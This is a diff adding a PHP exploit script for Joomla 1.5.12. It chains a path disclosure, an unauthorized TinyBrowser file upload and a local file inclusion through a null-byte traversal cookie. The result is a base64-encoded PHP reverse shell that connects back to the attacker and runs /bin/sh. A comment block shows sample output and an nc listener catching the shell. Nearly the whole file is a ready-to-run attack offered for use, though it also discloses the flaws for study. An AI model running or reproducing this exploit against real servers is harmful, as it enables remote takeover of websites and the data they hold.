@@ -1,0 +1,191 @@
+#!/usr/bin/php
+<?php
+/*
+	Copyright (c) ITIX LTD
+
+	This program is free software: you can redistribute it and/or modify
+	it under the terms of the GNU General Public License as published by
+	the Free Software Foundation, either version 3 of the License, or
+	(at your option) any later version.
+
+	This program is distributed in the hope that it will be useful,
+	but WITHOUT ANY WARRANTY; without even the implied warranty of
+	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+	GNU General Public License for more details.
+
+	You should have received a copy of the GNU General Public License
+	along with this program.  If not, see <http://www.gnu.org/licenses/>.
+
+	TITLE:		Joomla 1.5.12 connect back exploit
+	AUTHOR:		Nikola Petrov (vp.nikola@gmail.com)
+	VERSION:	1.0
+	LICENSE:	GNU General Public License
+
+	Platform: Joomla 1.5.12
+	Vulnerabilities discovery and implementation: Nikola Petrov (vp.nikola@gmail.com)
+	Date: 27.08.2009
+
+	Joomla 1.5.12 suffers from different kinds of vulnerabilities:
+		- path disclosure
+		- unauthorized file upload
+		- local file inclusion
+ 
+	I heard of unauthorized file upload in Joomla 1.5.12 and I decided to make some research on the topic. Soon after
+	that I found two more vulnerabilities - path disclosure and local file inclusion. Maybe there are more vulnerabilities
+	but these are enough to get a connection back from the server.
+
+	Path disclosure: joomla/libraries/joomla/client/ldap.php
+	Unauthorized file upload: joomla/plugins/editors/tinymce/jscripts/tiny_mce/plugins/tinybrowser/upload.php (upload_file.php)
+	Local file inclusion: joomla/plugins/editors/tinymce/jscripts/tiny_mce/plugins/tinybrowser/folders.php
+
+	Here is the LFI vulnerability:
+	-- snip-snip: folders.php --
+	<?php
+		require_once('config_tinybrowser.php');
+		// Set language
+
+		if(isset($tinybrowser['language']) && file_exists('langs/'.$tinybrowser['language'].'.php')) {
+			require_once('langs/'.$tinybrowser['language'].'.php'); 
+		}
+		else {
+			require_once('langs/en.php'); // Falls back to English
+		}
+		...
+	-- snip-snip --
+
+	[wadmin@M01 1.5.12]$ ./jtiny-1-5-12.php localhost 80 / localhost 9090
+
+	[+] web root: /var/www/html
+	[+] tinybrowser secret: s0merand0mjunk!!!111
+	[+] Shell successfully uploaded.
+	[+] Executing shell...
+	[wadmin@M01 1.5.12]$
+
+	[wadmin@M01 /]$ nc -vvv -l 9090
+	Connection from 127.0.0.1 port 9090 [tcp/websm] accepted
+	id && uname -a
+	uid=48(apache) gid=48(apache) groups=48(apache)
+	Linux M01 2.6.30 #1 SMP Tue Jun 16 19:34:59 EEST 2009 i686 i686 i386 GNU/Linux
+	exit
+	[wadmin@M01 /]$ 
+*/
+
+	if($argc < 6) {
+		print "\tvulnerabilities discovery and implementation: Nikola Petrov (vp.nikola@gmail.com)\n";
+		print "\tusage: ./jtiny-1-5-12.php <remote host> <remote port> <remote path> <local address> <local port> [remote doc root] [tinybrowser secret/obfuscate]\n";
+		print "\texample: jtiny-1-5-12.php localhost 80 / localhost 9090\n\n";
+		exit();
+	}
+
+	$RemoteHost	= $argv[1];
+	$RemotePort	= $argv[2];
+	$RemotePath	= $argv[3];
+	$LocalAddress	= $argv[4];
+	$LocalPort	= $argv[5];
+
+	if($argc == 7) $RemoteDocRoot = $argv[6];
+	else $RemoteDocRoot = getRemoteDocRoot($RemoteHost, $RemotePath);
+
+	if($argc == 8) $Secret = $argv[7]; 
+	else $Secret = "s0merand0mjunk!!!111";
+
+	print "[+] web root: $RemoteDocRoot\n";
+	print "[+] tinybrowser secret: $Secret\n";
+
+	$Shell = 
+		"PD9waHAKCSRBZGRyZXNzID0gJF9HRVRbJ19yYWRkcmVz".
+		"cyddOwoJJFBvcnQgPSAkX0dFVFsnX3Jwb3J0J107CgoJ".
+		"QCRTb2NrZXQgPSBzdHJlYW1fc29ja2V0X2NsaWVudCgi".
+		"dGNwOi8vJEFkZHJlc3M6JFBvcnQiKSBvciBkaWUoIkNh".
+		"bm5vdCBjb25uZWN0IGJhY2sgYXQgJEFkZHJlc3M6JFBv".
+		"cnRcbiIpOwoJJFByb2MgPSBwcm9jX29wZW4oJy9iaW4v".
+		"c2gnICxhcnJheShhcnJheSgncGlwZScsJ3InKSAsYXJy".
+		"YXkoJ3BpcGUnLCd3JykgLGFycmF5KCdwaXBlJywndycp".
+		"KSwgJFApOwoJCgkkUEk9JFBbMF07CgkkUE89JFBbMV07".
+		"CgkkUEU9JFBbMl07CgoJJE51bGwgPSBudWxsOwoKCXdo".
+		"aWxlKDEpIHsKCQkkU0w9YXJyYXkoJFNvY2tldCwkUE8s".
+		"JFBFKTsKCQlzdHJlYW1fc2VsZWN0KCRTTCwgJE51bGws".
+		"ICROdWxsLCAxKTsKCgkJZm9yZWFjaCgkU0wgYXMgJiRW".
+		"KSAgewoJCQlpZigkVj09PSRTb2NrZXQpIGZ3cml0ZSgk".
+		"UEksZnJlYWQoJFNvY2tldCwgNDA5NikpOwoJCQllbHNl".
+		"aWYgKCRWPT09JFBPKSBmd3JpdGUoJFNvY2tldCxmcmVh".
+		"ZCgkUE8sIDQwOTYpKTsKCQkJZWxzZWlmKCRWPT09JFBF".
+		"KSBmd3JpdGUoJFNvY2tldCxmcmVhZCgkUEUsIDQwOTYp".
+		"KTsKCQkJaWYoZmVvZigkU29ja2V0KSB8fCBmZW9mKCRQ".
+		"TykpIGV4aXQ7CgkJfQoJfQo/Pgo=";
+
+	$File = fopen("./_shell", "w") or die("Cannot open: ./_shell");
+	fwrite($File, base64_decode($Shell));
+	fclose($File);
+
+	#print "uploadFile($RemoteHost, $RemotePath, ./_shell, md5($RemoteDocRoot.$Secret)\n";
+	if(uploadFile($RemoteHost, $RemotePath, "./_shell", md5($RemoteDocRoot.$Secret)) == false) {
+		print "[-] Cannot upload shell.\n\n";
+		unlink("_shell");
+		exit();	
+	}
+	else print "[+] Shell successfully uploaded.\n";
+	unlink("_shell");
+
+	print "[+] Executing shell...\n";
+	shellExec($RemoteHost, $RemotePath, $RemoteDocRoot, $LocalAddress, $LocalPort);
+
+	function getRemoteDocRoot($aRemoteHost, $aRemotePath) {
+		$Client = curl_init();
+
+		curl_setopt($Client, CURLOPT_URL, $aRemoteHost . $aRemotePath . "/libraries/joomla/client/ldap.php");
+		curl_setopt($Client, CURLOPT_RETURNTRANSFER, 1) ;
+		curl_setopt($Client, CURLOPT_HEADER, 0);
+
+		$Response = curl_exec($Client);
+		if(($HttpCode = curl_getinfo($Client, CURLINFO_HTTP_CODE)) != 200) {
+			print "[-] getRemoteDocRoot() recieved http code $HttpCode.\n";
+			exit();
+		}
+
+
+		curl_close($Client);
+
+		$Step1 = strpos($Response, "not found in <b>") + 16;
+		$Step2 = strpos($Response, "/libraries/joomla/");
+
+		if(strlen($aRemotePath) > 1) return substr(substr($Response, $Step1, $Step2 - $Step1), 0, -strlen($aRemotePath));
+		else return substr($Response, $Step1, $Step2 - $Step1); 
+	}
+
+	function uploadFile($aRemoteHost, $aRemotePath, $aFilePath, $aSecret) {
+	  	$Client = curl_init("http://$aRemoteHost$aRemotePath/plugins/editors/tinymce/jscripts/tiny_mce/plugins/tinybrowser/upload_file.php?folder=". $aRemotePath ."/images/stories&type=image&feid=&obfuscate=$aSecret&sessidpass=");
+
+	  	curl_setopt($Client, CURLOPT_POSTFIELDS, array('Filedata'=>"@$aFilePath"));
+	  	curl_setopt($Client, CURLOPT_RETURNTRANSFER, 1);
+
+	  	$Response = curl_exec($Client);
+		if(($HttpCode = curl_getinfo($Client, CURLINFO_HTTP_CODE)) != 200) {
+			print "[-] uploadFile() recieved http code $HttpCode.\n";
+			exit();
+		}
+
+		curl_close($Client);
+
+	  	return strpos($Response, "File Upload Success");
+	}
+
+	function shellExec($aRemoteHost, $aRemotePath, $aRemoteDocRoot, $aLocalAddress, $aLocalPort) {
+		$Shell = "../../../../../../../../../../../../../../../../../../../../../../../../../../". $aRemoteDocRoot . $aRemotePath ."/images/stories/_shell_%00";
+
+		$VulnerableFile = $aRemoteHost . $aRemotePath . "/plugins/editors/tinymce/jscripts/tiny_mce/plugins/tinybrowser/folders.php?_raddress=$aLocalAddress&_rport=$aLocalPort";
+
+
+		$Client = curl_init();
+
+		curl_setopt($Client, CURLOPT_URL, $VulnerableFile);
+		curl_setopt($Client, CURLOPT_RETURNTRANSFER, 1) ;
+		curl_setopt($Client, CURLOPT_HEADER, 0);
+		curl_setopt($Client, CURLOPT_COOKIE, "tinybrowser_lang=$Shell");
+
+		$Response = curl_exec($Client);
+		curl_close($Client);
+
+		print $Response;
+	}
+?>
